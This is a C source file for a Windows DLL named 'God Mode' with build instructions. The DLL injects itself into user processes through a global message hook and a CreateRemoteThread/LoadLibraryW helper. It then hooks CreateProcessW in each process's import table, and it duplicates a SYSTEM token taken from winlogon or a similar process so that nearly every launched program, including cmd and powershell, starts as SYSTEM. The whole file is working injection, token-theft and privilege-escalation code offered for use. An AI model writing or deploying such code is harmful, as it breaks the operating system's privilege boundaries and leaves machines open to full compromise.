/**
 * gmhook.c — God Mode Global Shell Hook DLL
 *
 * Injects into ALL user processes via:
 * 1. SetWindowsHookEx(WH_GETMESSAGE, ...) for automatic injection into new GUI processes
 * 2. Explicit injection into any process via InjectIntoProcess export
 *
 * Hooks CreateProcessW to intercept EVERY process launch before it starts executing.
 * The intercepted process is created directly with a stolen SYSTEM primary token via
 * CreateProcessWithTokenW (needs only SeImpersonatePrivilege, which an interactive
 * Administrator token holds), so the child is BORN as SYSTEM.
 *
 * Only the absolute core OS processes are protected from elevation.
 * All other processes (explorer, cmd, powershell, all user apps) are elevated.
 *
 * Build: cl /LD /O2 gmhook.c /link /EXPORT:InstallHook /EXPORT:UninstallHook /EXPORT:GetMsgProc /EXPORT:InjectIntoProcess user32.lib ntdll.lib advapi32.lib kernel32.lib
 *   MinGW: gcc -O2 -Wall -shared -o gmhook.dll gmhook.c -ladvapi32 -lkernel32 -lntdll -luser32
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#endif

#define ProcessAccessToken 9

static BOOL IsSystemSid(PSID pSid) {
    if (!IsValidSid(pSid)) return FALSE;
    PUCHAR pCount = GetSidSubAuthorityCount(pSid);
    if (!pCount || *pCount != 1) return FALSE;
    PSID_IDENTIFIER_AUTHORITY pAuth = GetSidIdentifierAuthority(pSid);
    if (!pAuth) return FALSE;
    if (pAuth->Value[0] != 0 || pAuth->Value[1] != 0 || pAuth->Value[2] != 0 ||
        pAuth->Value[3] != 0 || pAuth->Value[4] != 0 || pAuth->Value[5] != 5)
        return FALSE;
    PDWORD pSub = GetSidSubAuthority(pSid, 0);
    if (!pSub) return FALSE;
    return *pSub == 18; /* SECURITY_LOCAL_SYSTEM_RID */
}

typedef NTSTATUS (NTAPI *NtSetInformationProcess_t)(
    HANDLE ProcessHandle,
    int ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength);

typedef BOOL (WINAPI *CreateProcessW_t)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

/* CreateProcessWithTokenW only needs SeImpersonatePrivilege (which an interactive
   Administrator token holds), unlike NtSetInformationProcess(ProcessAccessToken)
   which needs SeAssignPrimaryTokenPrivilege (Administrator does NOT hold it).
   This makes the child BORN as SYSTEM instead of swapping its token afterwards. */
typedef BOOL (WINAPI *CreateProcessWithTokenW_t)(
    HANDLE hToken,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

static NtSetInformationProcess_t pNtSetInfo = NULL;
static CreateProcessWithTokenW_t pCreateWithToken = NULL;
static CreateProcessW_t pOrigCreateProcessW = NULL;
static BOOL hookInstalled = FALSE;
static DWORD gSystemPid = 0;
static HANDLE gSystemToken = NULL;
static HMODULE gHModule = NULL;

static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privName, &luid)) { CloseHandle(hToken); return FALSE; }
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == 0;
}

static DWORD FindSystemPid(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    const wchar_t* names[] = { L"winlogon.exe", L"dwm.exe", L"fontdrvhost.exe", L"csrss.exe" };
    for (int i = 0; i < 4; i++) {
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, names[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        HANDLE hTok;
                        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
                            BYTE buf[256];
                            DWORD len;
                            if (GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                                TOKEN_USER* tu = (TOKEN_USER*)buf;
                                if (IsSystemSid(tu->User.Sid)) {
                                    CloseHandle(hTok);
                                    CloseHandle(hProc);
                                    CloseHandle(hSnap);
                                    return pe.th32ProcessID;
                                }
                            }
                            CloseHandle(hTok);
                        }
                        CloseHandle(hProc);
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
    }
    CloseHandle(hSnap);
    return 0;
}

static BOOL PrepareSystemToken(void) {
    if (gSystemToken) return TRUE;
    gSystemPid = FindSystemPid();
    if (!gSystemPid) return FALSE;
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, gSystemPid);
    if (!hProc) return FALSE;
    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        return FALSE;
    }
    if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &gSystemToken)) {
        CloseHandle(hTok);
        CloseHandle(hProc);
        gSystemToken = NULL;
        return FALSE;
    }
    CloseHandle(hTok);
    CloseHandle(hProc);
    return TRUE;
}

/* Minimal critical list — only the absolute core OS processes that must never be touched */
static BOOL IsCriticalProcess(const wchar_t* baseName) {
    if (!baseName) return TRUE;
    const wchar_t* critical[] = {
        L"csrss.exe", L"lsass.exe", L"services.exe", L"smss.exe",
        L"winlogon.exe", L"wininit.exe", L"svchost.exe", L"dwm.exe",
        L"fontdrvhost.exe", L"System", L"Registry", L"Memory Compression",
        L"Secure System", L"Idle", NULL
    };
    for (int i = 0; critical[i]; i++) {
        if (_wcsicmp(baseName, critical[i]) == 0) return TRUE;
    }
    return FALSE;
}

static BOOL WINAPI HookCreateProcessW(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation)
{
    if (!lpApplicationName && !lpCommandLine) {
        return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
            lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
            lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    }

    const wchar_t* exePath = lpApplicationName;
    wchar_t parsedPath[MAX_PATH] = {0};
    if (!exePath && lpCommandLine) {
        const wchar_t* p = lpCommandLine;
        while (*p == L' ') p++;
        if (*p == L'"') {
            p++;
            int i = 0;
            while (*p && *p != L'"' && i < MAX_PATH - 1) parsedPath[i++] = *p++;
            parsedPath[i] = 0;
            exePath = parsedPath;
        } else {
            int i = 0;
            while (*p && *p != L' ' && i < MAX_PATH - 1) parsedPath[i++] = *p++;
            parsedPath[i] = 0;
            exePath = parsedPath;
        }
    }

    const wchar_t* baseName = exePath;
    if (baseName) {
        const wchar_t* slash = wcsrchr(baseName, L'\\');
        if (slash) baseName = slash + 1;
    }

    /* Pass through critical OS processes untouched */
    if (IsCriticalProcess(baseName)) {
        return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
            lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
            lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    }

    /* Ensure token is ready */
    if (!gSystemToken) {
        EnablePrivilege(L"SeDebugPrivilege");
        EnablePrivilege(L"SeImpersonatePrivilege");
        if (!PrepareSystemToken()) {
            return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
                lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
                lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
        }
    }

    /* Create the child process directly with the stolen SYSTEM primary token.
       CreateProcessWithTokenW only requires SeImpersonatePrivilege (held by the
       Administrator token), so this works from an interactive Admin session where
       the old NtSetInformationProcess token-swap (SeAssignPrimaryTokenPrivilege)
       could never succeed. The child is BORN as SYSTEM. */
    if (pCreateWithToken) {
        BOOL ret = pCreateWithToken(gSystemToken, 0, lpApplicationName, lpCommandLine,
            dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo,
            lpProcessInformation);
        if (ret) return TRUE;
        /* CreateProcessWithTokenW failed (rare: bad flags/inheritance). Fall back to
           the original CreateProcessW so the app still launches unelevated instead
           of vanishing — no flashing, no silent close. */
    }

    return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
        lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

/* IAT hook: much safer on x64 because we never touch instruction bytes. */
static BOOL InstallIATHook(void) {
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
        ((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (!importDesc) return FALSE;

    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) return FALSE;
    void* realAddr = GetProcAddress(hKernel, "CreateProcessW");
    if (!realAddr) return FALSE;

    for (; importDesc->Name; importDesc++) {
        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->FirstThunk);
        if (!thunk) continue;

        if (origThunk) {
            for (; origThunk->u1.AddressOfData; origThunk++, thunk++) {
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;
                PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)
                    ((BYTE*)hMod + origThunk->u1.AddressOfData);
                if (strcmp(import->Name, "CreateProcessW") != 0) continue;

                DWORD oldProtect;
                if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                   PAGE_READWRITE, &oldProtect)) {
                    pOrigCreateProcessW = (CreateProcessW_t)thunk->u1.Function;
                    thunk->u1.Function = (ULONG_PTR)HookCreateProcessW;
                    VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                   oldProtect, &oldProtect);
                    return TRUE;
                }
            }
        } else {
            /* OriginalFirstThunk is NULL; match by address */
            for (; thunk->u1.Function; thunk++) {
                if (thunk->u1.Function == (ULONG_PTR)realAddr) {
                    DWORD oldProtect;
                    if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                       PAGE_READWRITE, &oldProtect)) {
                        pOrigCreateProcessW = (CreateProcessW_t)thunk->u1.Function;
                        thunk->u1.Function = (ULONG_PTR)HookCreateProcessW;
                        VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                       oldProtect, &oldProtect);
                        return TRUE;
                    }
                }
            }
        }
    }
    return FALSE;
}

static void RemoveIATHook(void) {
    if (!pOrigCreateProcessW) return;
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) return;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
        ((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (!importDesc) return;

    for (; importDesc->Name; importDesc++) {
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->FirstThunk);
        if (!thunk) continue;
        for (; thunk->u1.Function; thunk++) {
            if (thunk->u1.Function == (ULONG_PTR)HookCreateProcessW) {
                DWORD oldProtect;
                if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                   PAGE_READWRITE, &oldProtect)) {
                    thunk->u1.Function = (ULONG_PTR)pOrigCreateProcessW;
                    VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
                                   oldProtect, &oldProtect);
                }
                break;
            }
        }
    }
    pOrigCreateProcessW = NULL;
}


/* GetMsgProc for SetWindowsHookEx global injection */
__declspec(dllexport) LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && !hookInstalled) {
        wchar_t modName[MAX_PATH];
        GetModuleFileNameW(NULL, modName, MAX_PATH);
        wchar_t* baseName = wcsrchr(modName, L'\\');
        if (baseName) baseName++; else baseName = modName;
        if (!IsCriticalProcess(baseName)) {
            EnablePrivilege(L"SeDebugPrivilege");
            EnablePrivilege(L"SeImpersonatePrivilege");
            EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
            if (!gSystemToken) PrepareSystemToken();
            hookInstalled = InstallIATHook();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/* Exported install/uninstall for manual injection */
__declspec(dllexport) void InstallHook(void) {
    if (!hookInstalled) {
        hookInstalled = InstallIATHook();
    }
}

__declspec(dllexport) void UninstallHook(void) {
    if (hookInstalled) {
        RemoveIATHook();
        hookInstalled = FALSE;
    }
}

/* Explicit injection helper: injects this DLL into a target process */
__declspec(dllexport) BOOL InjectIntoProcess(DWORD pid) {
    if (!gHModule) return FALSE;

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return FALSE;

    wchar_t dllPath[MAX_PATH];
    if (!GetModuleFileNameW(gHModule, dllPath, MAX_PATH)) {
        CloseHandle(hProc);
        return FALSE;
    }

    SIZE_T len = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) {
        CloseHandle(hProc);
        return FALSE;
    }

    if (!WriteProcessMemory(hProc, remoteBuf, dllPath, len, NULL)) {
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLibrary, remoteBuf, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

/* DLL Entry */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        gHModule = hModule;
        DisableThreadLibraryCalls(hModule);
        pNtSetInfo = (NtSetInformationProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationProcess");
        pCreateWithToken = (CreateProcessWithTokenW_t)GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "CreateProcessWithTokenW");
        if (pCreateWithToken) {
            /* Only install hook if this process is not critical */
            wchar_t modName[MAX_PATH];
            GetModuleFileNameW(NULL, modName, MAX_PATH);
            wchar_t* baseName = wcsrchr(modName, L'\\');
            if (baseName) baseName++; else baseName = modName;
            if (!IsCriticalProcess(baseName)) {
                EnablePrivilege(L"SeDebugPrivilege");
                EnablePrivilege(L"SeImpersonatePrivilege");
                EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
                if (!gSystemToken) PrepareSystemToken();
                hookInstalled = InstallIATHook();
            }
        }
    } else if (reason == DLL_PROCESS_DETACH) {
        if (hookInstalled) {
            RemoveIATHook();
        }
        if (gSystemToken) CloseHandle(gSystemToken);
    }
    return TRUE;
}
